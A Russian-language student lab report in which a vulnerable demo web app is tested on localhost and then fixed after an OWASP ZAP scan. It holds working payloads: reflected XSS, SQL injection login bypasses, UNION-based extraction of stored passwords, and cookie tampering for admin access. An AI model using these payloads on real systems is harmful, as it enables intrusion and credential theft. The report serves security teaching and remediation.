<div align="center">
<h1><a id="intro">Лабораторная работа №8</a><br></h1>
<a href="https://docs.github.com/en"><img src="https://img.shields.io/static/v1?logo=github&logoColor=fff&label=&message=Docs&color=36393f&style=flat" alt="GitHub Docs"></a>
<a href="https://daringfireball.net/projects/markdown"><img src="https://img.shields.io/static/v1?logo=markdown&logoColor=fff&label=&message=Markdown&color=36393f&style=flat" alt="Markdown"></a> 
<a href="https://symbl.cc/en/unicode-table"><img src="https://img.shields.io/static/v1?logo=unicode&logoColor=fff&label=&message=Unicode&color=36393f&style=flat" alt="Unicode"></a> 
<a href="https://shields.io"><img src="https://img.shields.io/static/v1?logo=shieldsdotio&logoColor=fff&label=&message=Shields&color=36393f&style=flat" alt="Shields"></a>
<a href="https://img.shields.io/badge/Risk_Analyze-2448a2"><img src="https://img.shields.io/badge/Course-Risk_Analysis-2448a2" alt= "RA"></a> <img src="https://img.shields.io/badge/AppSec-2448a2" alt= "RA"></a> <img src="https://img.shields.io/badge/Contributor-Поддоскина_С._К.-8b9aff" alt="Contributor Badge"></a></div>

## Задание

- [x] 1. Разверните и подготовьте окружение для уязвимого приложения

```bash
$ python3 -m venv venv
$ source venv/bin/activate
$ pip install -r requirements.txt && vulnerable-app/requirements.txt 
```

- [x] 2. Запустите уязвимое приложение

```bash
$ docker-compose up -d --build  # http://localhost:8080
```

- [x] 3. Проверьте доступность приложения

```bash
$ curl -i http://localhost:8080
```

Вывод такой:

```bash
HTTP/1.1 200 OK
Server: xxxxx/xxxxx Python/xxxxx
Date: xxxxx, xxxxx xxxxx 2025 xxxxx GMT
Content-Type: text/html; charset=utf-8
Content-Length: 625
Set-Cookie: session=guest-session-id; Path=/
Connection: close


    <h1>Vulnerable DAST Demo App</h1>
    <p>Пример уязвимого приложения для лабораторной по DAST.</p>
    <ul>
      <li><a href="/echo?msg=Hello">Reflected XSS / echo</a></li>
      <li><a href="/search?username=admin">SQL Injection / search</a></li>
      <li><a href="/login">Небезопасный логин</a></li>
      <li><a href="/profile">Профиль (зависит от cookie)</a></li>
      <li><a href="/admin">«Админка» без нормальной авторизации</a></li>
      <li><a href="/files/">Directory listing</a></li>
    </ul>
```

- [x] 4. Проведите ручное исследование уязвимостей и опишите почему такое происходит, каким образом реализуются уязвимости и дайте им определение

- [x] 4.1. `/echo` - проверить отражение параметра  `msg`  в `HTML` и использовать `payload` вида  `<script>alert('XSS')</script>` зафиксировав его поведение

```bash
http://localhost:8080/echo?msg=<script>alert('hack with XSS')</script>
```

Проверяем:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i "http://localhost:8080/echo?msg=%3Cscript%3Ealert('hack%20with%20XSS')%3C%2Fscript%3E"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 22:40:26 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 261
Connection: close


    <h2>Echo</h2>
    <p>Сообщение: <script>alert('hack with XSS')</script></p>
    <p>Попробуйте передать что-нибудь вроде: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
    <a href="/">Назад</a>
```

**Reflected XSS** - тип XSS, где ввод пользователя отражается сервером в ответе без экранирования/фильтрации и исполняется браузером как код.

**Причина:** сервер вставляет `msg` напрямую в HTML (например, через конкатенацию строк), не применяя escaping (`<` `>` `"` и т.д.).

- [x] 4.2. `/search` - проверить обычный запрос  `?username=admin` и использовать строку  `?username=admin' OR '1'='1` зафиксировав его поведение описав признак SQLi

```bash
http://localhost:8080/search?username=admin' OR '1'='1
```

Проверяем:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i "http://localhost:8080/search?username=admin%27%20OR%20%271%27%3D%271"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 22:43:08 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 442
Connection: close


    <h2>Поиск пользователя</h2>
    <p>Запрос: <code>SELECT id, username, role FROM users WHERE username = &#39;admin&#39; OR &#39;1&#39;=&#39;1&#39;</code></p>


      <ul>

        <li>3 – admin (admin)</li>

        <li>4 – user (user)</li>

      </ul>

    <p>Попробуйте, например: <code>?username=admin' OR '1'='1</code></p>
    <a href="/">Назад</a>
```

**SQL Injection** - внедрение SQL-фрагмента через пользовательский ввод, когда приложение строит запрос конкатенацией строк.

Пример плохого паттерна:
```sql
SELECT ... WHERE username = '<user_input>'
```

Инъекция `admin' OR '1'='1` превращает условие в истинное для всех строк.

- [x] 4.3. `/login` - войти под  `admin`  и  `user` проверив логику на открытые пароли и простые SQL‑запросы

Пробуем:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i "http://localhost:8080/login"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 22:48:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 394
Connection: close


        <h2>Логин</h2>
        <form method="post">
          <label>Username: <input type="text" name="username"></label><br>
          <label>Password: <input type="password" name="password"></label><br>
          <button type="submit">Login</button>
        </form>
        <p>Попробуйте: admin / admin123 или user / user123</p>
        <a href="/">Назад</a>
```

Входим как `admin`:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i -X POST "http://localhost:8080/login" --data "username=admin&password=admin123"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 22:49:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 91
Set-Cookie: user=admin; Path=/
Set-Cookie: role=admin; Path=/
Connection: close

<h2>Добро пожаловать, admin (admin)!</h2><a href='/'>На главную</a>
```

Входим как `user`:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i -X POST "http://localhost:8080/login" --data "username=user&password=user123"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 22:50:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 89
Set-Cookie: user=user; Path=/
Set-Cookie: role=user; Path=/
Connection: close

<h2>Добро пожаловать, user (user)!</h2><a href='/'>На главную</a>
```

Пробуем зайти с логином `admin' --` и любым паролем:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i -X POST "http://localhost:8080/login" --data "username=admin' --&password=svepodd"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 22:55:36 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 91
Set-Cookie: user=admin; Path=/
Set-Cookie: role=admin; Path=/
Connection: close

<h2>Добро пожаловать, admin (admin)!</h2><a href='/'>На главную</a>
```

Пробуем инъекцию `admin' OR '1'='1`:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i -X POST "http://localhost:8080/login" --data "username=admin&password=' OR '1'='1"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 22:57:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 91
Set-Cookie: user=admin; Path=/
Set-Cookie: role=admin; Path=/
Connection: close

<h2>Добро пожаловать, admin (admin)!</h2><a href='/'>На главную</a>
```

 **SQL Injection (SQLi)** - уязвимость, при которой пользовательский ввод попадает в SQL-запрос без параметризации/экранирования, позволяя изменять логику запроса. 
 
 **Weak Authentication / Information Disclosure** - слабая аутентификация и раскрытие учетных данных, когда логины/пароли известны или опубликованы в интерфейсе.

- [x] 4.4. `/profile` - изменить `cookie  role`  на  `admin`  через `DevTools` → `Application` → `Cookies` и обновить  `/profile` (возможно создать `cookie`)

Переходим:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i "http://localhost:8080/profile"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:01:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 241
Connection: close


    <h2>Профиль пользователя</h2>
    <p>Имя: guest</p>
    <p>Роль: guest</p>
    <p>Cookie легко подделать: можно выдать себе роль 'admin'.</p>
    <a href="/">Назад</a>
```

Меняем cookie:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i -H "Cookie: user=admin; role=admin" http://localhost:8080/profile
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:08:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 241
Connection: close


    <h2>Профиль пользователя</h2>
    <p>Имя: admin</p>
    <p>Роль: admin</p>
    <p>Cookie легко подделать: можно выдать себе роль 'admin'.</p>
    <a href="/">Назад</a>
```

**Insecure Direct Object / Cookie Tampering** - подделка клиентских файлов (cookie) без серверной верификации, дающая доступ к чужим привилегиям.

- [x] 4.5. `/admin` -  проверить, что доступ запрещён без `cookie  role=admin` и далее подделать `cookie`, что «админка» открывается путем изменения через `DevTools`. **Подсказка:** доступ завязан на значение cookie, без подписи/ токена/ серверной проверки.

Доступ запрещён без `cookie  role=admin`:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08/vulnerable-app$ curl -i "http://localhost:8080/admin"
HTTP/1.1 403 FORBIDDEN
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:16:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 140
Connection: close

<h2>Доступ запрещён: вы не admin</h2><p>Попробуйте изменить cookie 'role'.</p><a href='/'>Назад</a>
```

Подделываем cookie и открываем `/admin`:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08/vulnerable-app$ curl -i -H "Cookie: user=admin; role=admin" "http://localhost:8080/admin"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:17:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 236
Connection: close


    <h2>Admin panel</h2>
    <p>Секретные настройки приложения (демо).</p>
    <ul>
      <li>DEBUG: true</li>
      <li>FEATURE_FLAG: experimental_mode</li>
    </ul>
    <a href="/">Назад</a>
```

Попробуем зайти под обычным пользователем, но выставить роль админа, и видим успех:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08/vulnerable-app$ curl -i -H "Cookie: user=user; role=admin" "http://localhost:8080/admin"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:19:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 236
Connection: close


    <h2>Admin panel</h2>
    <p>Секретные настройки приложения (демо).</p>
    <ul>
      <li>DEBUG: true</li>
      <li>FEATURE_FLAG: experimental_mode</li>
    </ul>
    <a href="/">Назад</a>
```

**Broken Access Control** - нарушение контроля доступа, при котором приложение принимает решение о правах пользователя на основании данных, которые можно изменить на стороне клиента.

**Причина:** проверка доступа реализована через чтение `role` из cookie без подписи и без серверной верификации. Любой пользователь может вручную установить `role=admin` и получить доступ к защищённому разделу.

- [x] 4.6. `/files/` - просмотрите `directory listing` и откройте один из файлов убедившись, что оно выводится

```bash
http://localhost:8080/files/secret.txt
```

Пробуем:

```bash
svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08/vulnerable-app$ curl -i "http://localhost:8080/files/"
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:23:31 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 61
Connection: close

<h2>Путь не найден</h2><a href='/'>Назад</a>

(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08/vulnerable-app$ curl -i "http://localhost:8080/files/secret.txt"
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:23:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 61
Connection: close

<h2>Путь не найден</h2><a href='/'>Назад</a
```

Не работает, потому что каталог `files/` не включён в image, а значит внутри контейнера путь не существует.

Чтобы все заработало, пришлось доработать `Dockerfile` и добавить в него строку `COPY files ./files`. После перезапуска:

```bash
</pre>(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i "http://localhost:8080/files/"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:32:38 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 227
Connection: close


        <h2>Files under /files/</h2>
        <ul><li><a href='/files/secret.txt'>secret.txt</a></li></ul>
        <p>Пример directory listing без ограничений.</p>
        <a href="/">Назад</a>

(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i "http://localhost:8080/files/secret.txt"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:32:44 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 31
Connection: close

<pre>SECRET_TOKEN=123456
</pre>
```

**Directory listing / Information Disclosure** - уязвимость конфигурации/логики раздачи статических файлов, когда каталог доступен на просмотр, и пользователь может получать файлы по URL напрямую.

**Причина:** отсутствуют ограничения на выдачу файлов и отключение листинга, нет контроля доступа и фильтрации того, какие ресурсы допустимо отдавать.

- [x] 5. Доработайте по пп 4 лабораторную работу развив их содержимое, которое может выводиться (мин 1 пример)

1) Пробиваем версию SQLite

Поскольку эндпоинт `/search` формирует SQL-запрос конкатенацией строки, выполним `UNION SELECT` и вызовем системную функцию `sqlite_version()`.

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i "http://localhost:8080/search?username=%27%20UNION%20SELECT%201,%20sqlite_version(),%20%27db%27%20--%20"%20"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:42:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 422
Connection: close


    <h2>Поиск пользователя</h2>
    <p>Запрос: <code>SELECT id, username, role FROM users WHERE username = &#39;&#39; UNION SELECT 1, sqlite_version(), &#39;db&#39; -- &#39;</code></p>


      <ul>

        <li>1 – 3.46.1 (db)</li>

      </ul>

    <p>Попробуйте, например: <code>?username=admin' OR '1'='1</code></p>
    <a href="/">Назад</a>
```

Через SQLi можно получать системную информацию о СУБД, что подтверждает возможность выполнения произвольных `SELECT`-выражений.

2) Получаем пары username:password из users

Далее извлечём пары `username:password` из таблицы `users`. Для склейки строк используется оператор `||` (конкатенация в SQLite).

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08$ curl -i "http://localhost:8080/search?username=%27%20UNION%20SELECT%20999,%20username%20%7C%7C%20%27:%27%20%7C%7C%20password,%20role%20FROM%20users%20--%20"
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.11.14
Date: Tue, 13 Jan 2026 23:44:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 511
Connection: close


    <h2>Поиск пользователя</h2>
    <p>Запрос: <code>SELECT id, username, role FROM users WHERE username = &#39;&#39; UNION SELECT 999, username || &#39;:&#39; || password, role FROM users -- &#39;</code></p>


      <ul>

        <li>999 – admin:admin123 (admin)</li>

        <li>999 – user:user123 (user)</li>

      </ul>

    <p>Попробуйте, например: <code>?username=admin' OR '1'='1</code></p>
    <a href="/">Назад</a>
```

Это демонстрирует утечку паролей из БД через SQLi. SQLi позволяет выполнять произвольные SELECT и извлекать чувствительные данные, нарушая конфиденциальность.

- [x] 6. Поставьте `OWASP ZAP` и стяните образ конкртеной версии для него

```bash
$ sudo snap install zaproxy --classic
$ docker pull ghcr.io/zaproxy/zaproxy:stable
```

- [x] 7. Задайте переменные окружения для работы скриптов

```bash
$ export ZAP_IMAGE=ghcr.io/zaproxy/zaproxy:stable
$ TARGET_URL="${TARGET_URL:-http://host.docker.internal:8080}"
```

- [x] 8. Запустите скрипт автоматического сканирования DAST `OWASP ZAP`

```bash
$ ./zap_scan.sh
```

Результат запуска:

```bash
(venv) svepodd@DESKTOP-PPV5M0R:~/course_labs/labs/lab08/dast$ ./zap_scan.sh
[*] Running OWASP ZAP baseline scan against http://host.docker.internal:8080
[i] Using image: ghcr.io/zaproxy/zaproxy:stable
[i] Reports will be saved to /home/svepodd/course_labs/labs/lab08/dast/reports
Using the Automation Framework
Total of 13 URLs
PASS: Vulnerable JS Library (Powered by Retire.js) [10003]
PASS: In Page Banner Information Leak [10009]
PASS: Cookie Without Secure Flag [10011]
PASS: Re-examine Cache-control Directives [10015]
PASS: Cross-Domain JavaScript Source File Inclusion [10017]
PASS: Content-Type Header Missing [10019]
PASS: Information Disclosure - Debug Error Messages [10023]
PASS: Information Disclosure - Sensitive Information in HTTP Referrer Header [10025]
PASS: HTTP Parameter Override [10026]
PASS: Information Disclosure - Suspicious Comments [10027]
PASS: Off-site Redirect [10028]
PASS: Cookie Poisoning [10029]
PASS: User Controllable Charset [10030]
PASS: User Controllable HTML Element Attribute (Potential XSS) [10031]
PASS: Viewstate [10032]
PASS: Directory Browsing [10033]
PASS: Heartbleed OpenSSL Vulnerability (Indicative) [10034]
PASS: Strict-Transport-Security Header [10035]
PASS: Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s) [10037]
PASS: X-Backend-Server Header Information Leak [10039]
PASS: Secure Pages Include Mixed Content [10040]
PASS: HTTP to HTTPS Insecure Transition in Form Post [10041]
PASS: HTTPS to HTTP Insecure Transition in Form Post [10042]
PASS: User Controllable JavaScript Event (XSS) [10043]
PASS: Big Redirect Detected (Potential Sensitive Information Leak) [10044]
PASS: Retrieved from Cache [10050]
PASS: X-ChromeLogger-Data (XCOLD) Header Information Leak [10052]
PASS: CSP [10055]
PASS: X-Debug-Token Information Leak [10056]
PASS: Username Hash Found [10057]
PASS: X-AspNet-Version Response Header [10061]
PASS: PII Disclosure [10062]
PASS: Timestamp Disclosure [10096]
PASS: Hash Disclosure [10097]
PASS: Cross-Domain Misconfiguration [10098]
PASS: Weak Authentication Method [10105]
PASS: Reverse Tabnabbing [10108]
PASS: Modern Web Application [10109]
PASS: Dangerous JS Functions [10110]
PASS: Verification Request Identified [10113]
PASS: Script Served From Malicious Domain (polyfill) [10115]
PASS: ZAP is Out of Date [10116]
PASS: Absence of Anti-CSRF Tokens [10202]
PASS: Private IP Disclosure [2]
PASS: Session ID in URL Rewrite [3]
PASS: Script Passive Scan Rules [50001]
PASS: Stats Passive Scan Rule [50003]
PASS: Insecure JSF ViewState [90001]
PASS: Java Serialization Object [90002]
PASS: Sub Resource Integrity Attribute Missing [90003]
PASS: Charset Mismatch [90011]
PASS: Application Error Disclosure [90022]
PASS: WSDL File Detection [90030]
PASS: Loosely Scoped Cookie [90033]
WARN-NEW: Cookie No HttpOnly Flag [10010] x 2
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/ (200 OK)
WARN-NEW: Missing Anti-clickjacking Header [10020] x 4
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/files/secret.txt (200 OK)
        http://host.docker.internal:8080/search?username=admin (200 OK)
        http://host.docker.internal:8080/login (200 OK)
WARN-NEW: X-Content-Type-Options Header Missing [10021] x 5
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/echo?msg=Hello (200 OK)
        http://host.docker.internal:8080/files/ (200 OK)
        http://host.docker.internal:8080/files/secret.txt (200 OK)
        http://host.docker.internal:8080/search?username=admin (200 OK)
WARN-NEW: Information Disclosure - Sensitive Information in URL [10024] x 1
        http://host.docker.internal:8080/search?username=admin (200 OK)
WARN-NEW: Server Leaks Version Information via "Server" HTTP Response Header Field [10036] x 5
        http://host.docker.internal:8080/echo?msg=Hello (200 OK)
        http://host.docker.internal:8080/files/secret.txt (200 OK)
        http://host.docker.internal:8080/login (200 OK)
        http://host.docker.internal:8080/profile (200 OK)
        http://host.docker.internal:8080/search?username=admin (200 OK)
WARN-NEW: Content Security Policy (CSP) Header Not Set [10038] x 5
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/admin (403 Forbidden)
        http://host.docker.internal:8080/files/ (200 OK)
        http://host.docker.internal:8080/sitemap.xml (404 Not Found)
        http://host.docker.internal:8080/login (200 OK)
WARN-NEW: Non-Storable Content [10049] x 6
        http://host.docker.internal:8080/admin (403 Forbidden)
        http://host.docker.internal:8080/echo?msg=Hello (200 OK)
        http://host.docker.internal:8080/files/secret.txt (200 OK)
        http://host.docker.internal:8080/robots.txt (404 Not Found)
        http://host.docker.internal:8080/search?username=admin (200 OK)
WARN-NEW: Cookie without SameSite Attribute [10054] x 2
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/ (200 OK)
WARN-NEW: Permissions Policy Header Not Set [10063] x 5
        http://host.docker.internal:8080/admin (403 Forbidden)
        http://host.docker.internal:8080/files/ (200 OK)
        http://host.docker.internal:8080/robots.txt (404 Not Found)
        http://host.docker.internal:8080/search?username=admin (200 OK)
        http://host.docker.internal:8080/sitemap.xml (404 Not Found)
WARN-NEW: Source Code Disclosure - SQL [10099] x 1
        http://host.docker.internal:8080/search?username=admin (200 OK)
WARN-NEW: Authentication Request Identified [10111] x 1
        http://host.docker.internal:8080/login (200 OK)
WARN-NEW: Session Management Response Identified [10112] x 3
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/ (200 OK)
        http://host.docker.internal:8080/ (200 OK)
WARN-NEW: Insufficient Site Isolation Against Spectre Vulnerability [90004] x 15
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/echo?msg=Hello (200 OK)
        http://host.docker.internal:8080/files/ (200 OK)
        http://host.docker.internal:8080/files/secret.txt (200 OK)
        http://host.docker.internal:8080/search?username=admin (200 OK)
FAIL-NEW: 0     FAIL-INPROG: 0  WARN-NEW: 13    WARN-INPROG: 0  INFO: 0 IGNORE: 0       PASS: 54
[+] ZAP scan completed. Reports (if any) in /home/svepodd/course_labs/labs/lab08/dast/reports
-rw-r--r-- 1 svepodd svepodd 104K Jan 14 03:00 /home/svepodd/course_labs/labs/lab08/dast/reports/zap-report-20260114_030001.html
-rw-r--r-- 1 svepodd svepodd  39K Jan 14 03:00 /home/svepodd/course_labs/labs/lab08/dast/reports/zap-report-20260114_030001.json
-rw-r--r-- 1 svepodd svepodd  46K Jan 14 03:00 /home/svepodd/course_labs/labs/lab08/dast/reports/zap-report-20260114_030001.xml
[*] Converting JSON report to ODT/XLSX using /home/svepodd/course_labs/labs/lab08/dast/../venv/bin/python ...
[debug] python: /home/svepodd/course_labs/labs/lab08/venv/bin/python
[debug] odf imported OK
[*] Parsing ZAP JSON report: zap-report-20260114_030001.json
[i] Found 14 alerts
[+] ODT report saved: odt/zap-report-20260114_030001.odt
[+] XLSX report saved: xlsx/zap-report-20260114_030001.xlsx
[+] Report conversion completed!
```

- [x] 9. Изучите сгенерированные отчеты в `dast/reports` и опишите риски ИБ для них, без сценариев, так как ранее вы видели часть из их реализации

1) Medium

| Сработка                                     | Риск                                                                                                                                                    |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Content Security Policy (CSP) Header Not Set | Отсутствие CSP снижает устойчивость приложения к XSS/инъекциям контента, т.к. браузер не получает политики, ограничивающей источники скриптов/ресурсов. |
| Missing Anti-clickjacking Header             | Нет защиты от clickjacking, из-за чего страницы могут быть встраиваемы во фреймы сторонних сайтов.                                                      |
| Source Code Disclosure - SQL                 | Приложение раскрывает SQL-конструкции/SQL-фрагменты в ответах, что облегчает анализ структуры данных и повышает вероятность успешных атак на слой БД.   |

2) Low

| Сработка                                                                 | Риск                                                                                                                                                                                  |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Cookie No HttpOnly Flag                                                  | Cookies доступны из JavaScript, что повышает последствия XSS и риск компрометации сессионных данных/роли.                                                                             |
| Cookie without SameSite Attribute                                        | Отсутствие `SameSite` повышает вероятность отправки cookies в кросс-сайтовых запросах и ослабляет защиту от CSRF-класса угроз.                                                        |
| Insufficient Site Isolation Against Spectre Vulnerability                | Отсутствуют рекомендованные защитные заголовки из семейства изоляции ресурсов, что ослабляет защиту от некоторых классов side-channel атак в браузере.                                |
| Permissions Policy Header Not Set                                        | Не ограничены возможности браузерных API на уровне политик - повышается площадь атаки со стороны браузера/встраиваемого контента.                                                     |
| Server Leaks Version Information via "Server" HTTP Response Header Field | Утечка версий компонентов упрощает подбор уязвимостей под конкретные версии ПО.                                                                                                       |
| X-Content-Type-Options Header Missing                                    | Без `X-Content-Type-Options: nosniff` браузер может пытаться угадывать тип контента (MIME sniffing), что увеличивает шанс некорректной интерпретации ответов и связанных с этим атак. |

3) Informational

| Сработка                                              | Риск                                                                                                                                                                                                 |
| ----------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Authentication Request Identified                     | ZAP распознал запрос аутентификации (служебная информация для настройки контекста/автоматизации). Прямой уязвимостью не является.                                                                    |
| Information Disclosure - Sensitive Information in URL | Потенциально чувствительные данные передаются в URL (query string), что может утекать в логи, историю браузера, рефереры и прокси-логи.                                                              |
| Non-Storable Content                                  | Если ответы с чувствительными данными кэшируются на клиенте, возможна утечка данных или повторная выдача не тому пользователю.                                                                       |
| Session Management Response Identified                | Обнаружен маркер управления сессией (cookie), что полезно для настройки сканирования. Само по себе не уязвимость, но подтверждает наличие сессионного механизма и важность корректных cookie-флагов. |
| Storable and Cacheable Content                        | Может привести к выдаче устаревших или чужих данных при неправильном кэшировании.                                                                                                                    |

- [x] 10. Внесите исправления по данному отчету `DAST` для `vulnerable-app/app.py`

В файл `app.py` были внесены минимальные доработки для повышения защищённости приложения и снижения количества срабатываний DAST:
1. **Добавлены защитные HTTP-заголовки**:
    - `Content-Security-Policy (CSP)` - базовая политика источников, запрет `frame-ancestors`; 
    - `X-Frame-Options: DENY` - защита от clickjacking;
    - `X-Content-Type-Options: nosniff` - запрет MIME-sniffing;
    - `Permissions-Policy` - отключение доступа к чувствительным возможностям браузера;
    - `Cross-Origin-Resource-Policy: same-origin`;
    - `Cross-Origin-Opener-Policy: same-origin` и `Cross-Origin-Embedder-Policy: require-corp` — усиление site isolation (Spectre).
2. **Настроены заголовки кеширования** для запрета хранения страниц:
  	- `Cache-Control: no-store, no-cache, must-revalidate, max-age=0`,
  	- `Pragma: no-cache`,
  	- `Expires: 0`.
3. **Усилены cookie**: для `session`, `user`, `role` выставлены флаги `HttpOnly` и `SameSite=Lax`.
4. **Исправлен Reflected XSS на `/echo`**: параметр `msg` экранируется через `markupsafe.escape`, чтобы пользовательский ввод не исполнялся как HTML/JS.
5. **Устранена SQL Injection на `/search` и `/login`**: запросы переведены на параметризованные (`?`), без конкатенации строк SQL с вводом пользователя.
6. **Снижение “Sensitive info in URL” для `/search`**: поиск переведён на `POST`, а обращения вида `/search?username=...` перенаправляются на “чистый” `/search`.
7. **Безопасный вывод в `/files`**: имена файлов и содержимое выводятся с экранированием (через `escape`), чтобы исключить HTML-инъекции при отображении.

Повторно запускаем скрипт автоматического сканирования DAST `OWASP ZAP`:

```bash
WARN-NEW: Server Leaks Version Information via "Server" HTTP Response Header Field [10036] x 4
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/ (200 OK)
        http://host.docker.internal:8080/echo?msg=Hello (200 OK)
        http://host.docker.internal:8080/login (200 OK)
WARN-NEW: Non-Storable Content [10049] x 5
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/filessecret.txt (404 Not Found)
        http://host.docker.internal:8080/robots.txt (404 Not Found)
        http://host.docker.internal:8080/script (404 Not Found)
        http://host.docker.internal:8080/login (200 OK)
WARN-NEW: Authentication Request Identified [10111] x 1
        http://host.docker.internal:8080/login (200 OK)
WARN-NEW: Session Management Response Identified [10112] x 3
        http://host.docker.internal:8080 (200 OK)
        http://host.docker.internal:8080/ (200 OK)
        http://host.docker.internal:8080/ (200 OK)
FAIL-NEW: 0     FAIL-INPROG: 0  WARN-NEW: 4     WARN-INPROG: 0  INFO: 0 IGNORE: 0       PASS: 63
```

Описание сработок после исправления:

| Сработка                                                                 | Описание                                                                                                                                                                                                                                                                                    |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Server Leaks Version Information via "Server" HTTP Response Header Field | ZAP фиксирует, что в HTTP-заголовке `Server` раскрывается информация о версии сервера. В лабораторной работе это связано с использованием dev-сервера Werkzeug. В production обычно устраняется запуском приложения под WSGI-сервером и/или reverse proxy, где `Server` не содержит версий. |
| Non-Storable Content                                                     | Предупреждение относится к политике кеширования HTTP-ответов. ZAP отмечает ответы как потенциально кешируемые. В реальных системах для страниц с пользовательскими данными обычно принудительно задают строгие заголовки запрета хранения (`Cache-Control: no-store` и т.п.).               |
| Authentication Request Identified                                        | ZAP распознал endpoint аутентификации (`/login`). Это не уязвимость, а классификация точки входа.                                                                                                                                                                                           |
| Session Management Response Identified                                   | ZAP обнаружил, что приложение использует cookies/механизм управления сессией. Сам факт сессий не является уязвимостью.                                                                                                                                                                      |

- [x] 11. Делайте все необходимые коммиты по шагам и отправляйте изменения в удалённый репозиторий
- [x] 12. Подготовьте отчет `gist`.
- [x] 13. Почистите кеш от `venv` и остановите уязвимое приложение

```bash
$ deactivate
$ rm -rf venv
$ docker-compose -f docker-compose.yml down
$ docker system prune -f
```

***

Copyright (c) 2026 Svetlana Poddoskina
